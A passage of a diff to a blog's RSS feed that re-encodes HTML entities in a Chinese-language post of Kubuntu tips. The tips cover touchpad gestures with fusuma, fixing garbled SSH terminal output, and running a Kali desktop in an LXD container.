+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#34;xdotool key ctrl+alt+a&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;plugin:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  inputs:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    libinput_command_input:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      enable-tap: true
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      verbose: true
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;threshold:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  swipe: 0.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  pinch: 0.9
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;interval:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  swipe: 0.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  pinch: 0.5
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开机自启&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/iberianpig/fusuma&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;&lt;a class="link" href="https://github.com/iberianpig/fusuma"  target="_blank" rel="noopener"
     &gt;iberianpig/fusuma&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;ubuntu连接ssh后点击或者滚动鼠标都会出现乱码&#34;&gt;ubuntu连接ssh后点击或者滚动鼠标都会出现乱码&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/f5f026c0c822&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h2 id="ubuntu连接ssh后点击或者滚动鼠标都会出现乱码"&gt;ubuntu连接ssh后点击或者滚动鼠标都会出现乱码&lt;/h2&gt;
+&lt;p&gt;&lt;a class="link" href="https://www.jianshu.com/p/f5f026c0c822"  target="_blank" rel="noopener"
     &gt;SSH终端鼠标点击滚动出现乱码字符&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;输入&lt;code&gt;reset&lt;/code&gt;回车即可&lt;/p&gt;
-&lt;h2 id=&#34;kubuntu通过lxd安装kali桌面版虚拟机&#34;&gt;kubuntu通过lxd安装kali桌面版虚拟机&lt;/h2&gt;
+&lt;h2 id="kubuntu通过lxd安装kali桌面版虚拟机"&gt;kubuntu通过lxd安装kali桌面版虚拟机&lt;/h2&gt;
 &lt;p&gt;安装dbus-x11,否则会打不开xfce4-panel&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install dbus-x11
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt-get install dbus-x11
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;.bashrc 添加&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;export DISPLAY=:0
+&lt;pre tabindex="0"&gt;&lt;code&gt;export DISPLAY=:0
 cd ~
 export $(dbus-launch)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;宿主机直接运行即可
 &lt;code&gt;lxc exec gkali -- sudo -u kali -i xfce4-panel&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32.png&#34;
-	width=&#34;1680&#34;
-	height=&#34;727&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32_hu3cac17c82a2d071ec076e28d113bf528_208035_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32_hu3cac17c82a2d071ec076e28d113bf528_208035_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32.png"
+	width="1680"
+	height="727"
+	srcset="https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32_hu3cac17c82a2d071ec076e28d113bf528_208035_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/kubuntutricks/2021-04-17-23-13-32_hu3cac17c82a2d071ec076e28d113bf528_208035_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;231&#34;
-		data-flex-basis=&#34;554px&#34;
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="554px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/docs/containers/kalilinux-lxc-images/#gui-kali-lxd-container-on-ubuntu-host&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;&lt;a class="link" href="https://www.kali.org/docs/containers/kalilinux-lxc-images/#gui-kali-lxd-container-on-ubuntu-host"  target="_blank" rel="noopener"
     &gt;Kali Linux LXC/LXD Images | Kali Linux Documentation&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/devhackrahul/Kali-Linux-LXD&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;&lt;a class="link" href="https://github.com/devhackrahul/Kali-Linux-LXD"  target="_blank" rel="noopener"
     &gt;devhackrahul/Kali-Linux-LXD&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://askubuntu.com/questions/1005623/libdbusmenu-glib-warning-unable-to-get-session-bus-failed-to-execute-child&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;p&gt;&lt;a class="link" href="https://askubuntu.com/questions/1005623/libdbusmenu-glib-warning-unable-to-get-session-bus-failed-to-execute-child"  target="_blank" rel="noopener"
     &gt;LIBDBUSMENU-GLIB-WARNING **: Unable to get session bus: Failed to execute child process &amp;quot;dbus-launch&amp;quot; (No such file or directory) while x-forwarding&lt;/a&gt;&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>Archives</title>
-        <link>https://fragrant1001.github.io/archives/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://fragrant1001.github.io/archives/</guid>
-        <description></description>
-        </item>
-        <item>
-        <title>Search</title>
-        <link>https://fragrant1001.github.io/search/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://fragrant1001.github.io/search/</guid>
-        <description></description>
-        </item>
-        
-    </channel>
+</item>
+<item>
+<title>Archives</title>
+<link>https://fragrant1001.github.io/archives/</link>
+<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+<guid>https://fragrant1001.github.io/archives/</guid>
+<description/>
+</item>
+<item>
+<title>Search</title>
+<link>https://fragrant1001.github.io/search/</link>
+<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+<guid>https://fragrant1001.github.io/search/</guid>
+<description/>
+</item>
+</channel>
 </rss>
